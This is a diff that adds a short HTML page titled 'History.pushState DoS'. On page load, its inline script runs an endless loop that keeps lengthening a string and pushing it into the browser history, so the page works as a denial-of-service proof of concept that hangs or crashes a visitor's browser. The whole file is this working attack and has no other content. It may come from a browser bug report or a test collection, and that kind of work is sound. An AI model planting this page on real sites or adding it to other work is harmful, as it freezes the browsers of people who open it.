@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>History.pushState DoS</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <script>
+        let str = "";
+        let i = 0;
+        while(true) {
+            str += i.toString();
+            history.pushState(0, 0, str);
+            i++;
+        };
+    </script>
+</head>
+
+<body>
+
+</body>
+
+</html>
